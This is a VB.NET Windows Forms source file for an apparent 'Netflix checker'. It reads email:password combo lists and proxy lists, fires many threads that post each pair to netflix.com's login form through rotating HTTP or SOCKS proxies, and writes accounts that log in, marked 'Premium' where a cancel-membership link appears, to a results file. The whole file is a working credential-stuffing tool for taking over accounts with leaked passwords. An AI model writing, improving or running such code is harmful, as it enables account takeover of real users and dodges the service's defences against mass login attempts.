Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text.RegularExpressions
Imports System.Threading
Imports xNet
Public Class NetflixCheckerForm
    Private Sub NetflixCheckerForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
    Private dragging As Boolean
    Private offset As Point
    Dim date1 As String
    Public int_0 As Integer
    Public int_1 As Integer
    Public int_2 As Integer
    Public int_3 As Integer
    Public int_4 As Integer
    Public int_5 As Integer
    Public int_6 As Integer
    Public int_7 As Integer
    Public object_0 As Object = New Object
    Private point_0 As Point
    Public proxyType_0 As ProxyType
    Public queue_0 As Queue
    Public random_0 As Random = New Random
    Public string_0 As String()
    Public string_1 As String()
    Public string_2 As String() = New String(0 - 1) {}
    Public string_3 As String() = New String(0 - 1) {}
    Private string_5 As String = ""
    Public thread_0 As Thread()
    Private Declare Function CoInternetSetFeatureEnabled Lib "urlmon.dll" (int_8 As Integer, <MarshalAs(UnmanagedType.U4)> int_9 As Integer, bool_0 As Boolean) As <MarshalAs(UnmanagedType.[Error])> Integer
    Private Declare Function CreateRoundRectRgn Lib "Gdi32.dll" (int_8 As Integer, int_9 As Integer, int_10 As Integer, int_11 As Integer, int_12 As Integer, int_13 As Integer) As IntPtr
    Private testfile As String = Application.StartupPath & "\Netflix\Good" + "_" & DateTime.Now.ToString("M-d-yyyy_h-m") + ".txt"

    Public Sub New()
        Me.InitializeComponent()
        Control.CheckForIllegalCrossThreadCalls = False
        Me.TypeOfProxy.SelectedIndex = 0
        Me.NumericUpDown2.Value = 100
        TextBoxResult.SelectionAlignment = HorizontalAlignment.Center
    End Sub

    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
        Using dialog As OpenFileDialog = New OpenFileDialog
            dialog.Filter = "Text files | * .txt"
            If (dialog.ShowDialog = DialogResult.OK) Then
                Me.string_0 = Enumerable.ToArray(Of String)(Enumerable.Distinct(Of String)(File.ReadAllText(dialog.FileName).Replace(";", ":").Split(New Char() {ChrW(10)})))
                Me.int_0 = Me.string_0.Length
                Me.int_6 = Me.int_0
                Me.AmountOfAccounts.Text = Me.int_0.ToString
            End If
        End Using
    End Sub

    Private Sub LoadProxiesButton_Click(sender As Object, e As EventArgs) Handles LoadProxiesButton.Click
        Using dialog As OpenFileDialog = New OpenFileDialog
            dialog.Filter = "Text files | * .txt"
            If (dialog.ShowDialog = DialogResult.OK) Then
                Me.string_1 = Enumerable.ToArray(Of String)(Enumerable.Distinct(Of String)(File.ReadAllLines(dialog.FileName)))
                Me.int_1 = Me.string_1.Length
                Me.AmountOfProxies.Text = Me.int_1.ToString
            End If
        End Using
    End Sub

    Private Sub AmountOfThreads_TextChanged(sender As Object, e As EventArgs) Handles AmountOfThreads.TextChanged
        Dim num As Integer = 100
        Try
            num = Integer.Parse(Me.AmountOfThreads.Text)
        Catch obj1 As Exception
        End Try
        Me.NumericUpDown2.Value = num
    End Sub

    Private Sub StartChecking_Click(sender As Object, e As EventArgs) Handles StartChecking.Click
        Try
            Directory.CreateDirectory(String.Concat("Netflix\"))
            If Me.int_0 = 0 Then
                MessageBox.Show("Load Accounts.")
            ElseIf Me.int_1 = 0 Then
                MessageBox.Show("Load Proxies.")
            Else
                Select Case Me.TypeOfProxy.SelectedIndex
                    Case 0
                        Me.proxyType_0 = ProxyType.Http
                    Case 1
                        Me.proxyType_0 = ProxyType.Socks4
                    Case 2
                        Me.proxyType_0 = ProxyType.Socks5
                    Case Else
                        MessageBox.Show("Choose Proxy type")
                        Return
                End Select
                Me.int_2 = 0
                Me.int_3 = 0
                Me.string_2 = Nothing
                Me.string_3 = Nothing
                Me.int_5 = 0
                Me.int_7 = 0
                Me.int_6 = Me.int_0
                Me.queue_0 = New Queue()

                For i As Integer = 0 To Me.int_0 - 1
                    Me.queue_0.Enqueue(Me.string_0(i))
                Next
                Me.int_4 = Convert.ToInt32(Me.NumericUpDown2.Value)
                Me.thread_0 = New Thread(Me.int_4 - 1) {}
                For j As Integer = 0 To Me.int_4 - 1
                    Me.thread_0(j) = New Thread(New ThreadStart(AddressOf Me.method_5))
                    Me.thread_0(j).IsBackground = True
                    Me.thread_0(j).Start()
                Next
                Me.Timer1.Enabled = True
            End If
        Catch ex As Exception

        End Try
    End Sub
    Public Sub method_5()
        Dim proxyAddress As String = Me.string_1(Me.random_0.[Next](0, Me.int_1))
        While Me.queue_0.Count > 0
            Dim obj As Object = Me.object_0
            Dim flag As Boolean = False
            Dim obj2 As Object
            Dim text As String
            Try
                Dim expr_29 As Object = obj
                obj2 = expr_29
                Monitor.Enter(expr_29, flag)
                Try
                    text = Me.queue_0.Peek().ToString().TrimEnd(New Char() {vbCr}).Trim()
                    Me.queue_0.Dequeue()
                Catch ex As Exception

                End Try

            Finally
                If flag Then
                    Monitor.[Exit](obj2)
                End If
            End Try
            Dim array As String() = text.Split(New Char() {":"c})
            Try
                Using httpRequest As HttpRequest = New HttpRequest()
                    httpRequest.Proxy = ProxyClient.Parse(Me.proxyType_0, proxyAddress)
                    Dim cookies As CookieDictionary = New CookieDictionary(False)
                    httpRequest.Cookies = cookies
                    httpRequest.IgnoreProtocolErrors = True
                    httpRequest.ConnectTimeout = 25000
                    httpRequest.AllowAutoRedirect = True
                    httpRequest.KeepAlive = True
                    httpRequest.UserAgent = Http.ChromeUserAgent()
                    httpRequest.Referer = "https://www.netflix.com/"
                    Dim string_ As String = httpRequest.[Get]("https://www.netflix.com/login", Nothing).ToString()
                    Dim value As String = NetflixCheckerForm.smethod_0(string_, "data-reactid=""36""/><input type=""hidden"" name=""authURL"" value=""", """ data-reactid")
                    httpRequest.AddParam("email", array(0))
                    httpRequest.AddParam("password", array(1))
                    httpRequest.AddParam("rememberMe", "true")
                    httpRequest.AddParam("flow", "websiteSignUp")
                    httpRequest.AddParam("mode", "login")
                    httpRequest.AddParam("action", "loginAction")
                    httpRequest.AddParam("withFields", "email,password,rememberMe,nextPage,showPassword")
                    httpRequest.AddParam("authURL", value)
                    httpRequest.AddParam("nextPage", "https://www.netflix.com/YourAccount")
                    httpRequest.AddParam("showPassword", "")
                    Dim text2 As String = httpRequest.Post("https://www.netflix.com/login").ToString()
                    If text2.Contains("Sign out of Netflix") Then
                        Dim str As String
                        If text2.Contains("Cancel membership") Then
                            str = "Premium"
                        Else
                            str = "_"
                        End If
                        obj = Me.object_0
                        Dim flag2 As Boolean = False
                        Try
                            Dim expr_222 As Object = obj
                            obj2 = expr_222
                            Monitor.Enter(expr_222, flag2)
                            System.Array.Resize(Of String)(Me.string_2, Me.int_2 + 1)
                            Me.string_2(Me.int_2) = "---------------------Netflix Account---------------------" & vbNewLine & text & vbNewLine + "Subscription = " + str & vbNewLine
                            Me.int_2 += 1
                            Me.int_5 += 1
                            Me.int_6 -= 1
                            Continue While
                        Finally
                            If flag2 Then
                                Monitor.[Exit](obj2)
                            End If
                        End Try
                    End If
                    obj = Me.object_0
                    Dim flag3 As Boolean = False
                    Try
                        Dim expr_29E As Object = obj
                        obj2 = expr_29E
                        Monitor.Enter(expr_29E, flag3)
                        Me.int_3 += 1
                    Finally
                        If flag3 Then
                            Monitor.[Exit](obj2)
                        End If
                    End Try
                    Me.int_5 += 1
                    Me.int_6 -= 1
                End Using
            Catch
                Me.int_7 += 1
                Me.queue_0.Enqueue(text)
                proxyAddress = Me.string_1(Me.random_0.[Next](0, Me.int_1))
            End Try
        End While
        If Me.int_5 = Me.int_0 Then
            Me.method_6()
        End If
    End Sub
    Public Sub method_6()
        For i As Integer = 0 To Me.int_4 - 1
            Me.thread_0(i) = New Thread(New ThreadStart(AddressOf Me.method_5))
            Me.thread_0(i).IsBackground = True
            Me.thread_0(i).Abort()
        Next
    End Sub
    Public Shared Function smethod_0(ByVal string_6 As String, ByVal string_7 As String, ByVal string_8 As String) As String
        On Error Resume Next
        Return Regex.Match(string_6, (string_7 & "(.*?)" & string_8)).Groups.Item(1).Value
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.ValidAmount.Text = Me.int_2.ToString
        Me.InvalidAccounts.Text = Me.int_3.ToString
        Me.CheckedAmount.Text = Me.int_5.ToString
        '    Me.Label9.Text = Me.int_7.ToString
        If (Me.int_2 <> Enumerable.Count(Of String)(Me.TextBoxResult.Lines)) Then
            Me.TextBoxResult.Lines = Me.string_2
        End If
    End Sub

    Private Sub TextBoxResult_TextChanged(sender As Object, e As EventArgs) Handles TextBoxResult.TextChanged
        Try
            TextBoxResult.SaveFile(testfile, RichTextBoxStreamType.PlainText)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub TopMostToggle_CheckedChanged(sender As Object) Handles TopMostToggle.CheckedChanged
        If TopMostToggle.Checked = True Then
            Me.TopMost = True
        Else
            Me.TopMost = False
        End If
    End Sub
End Class
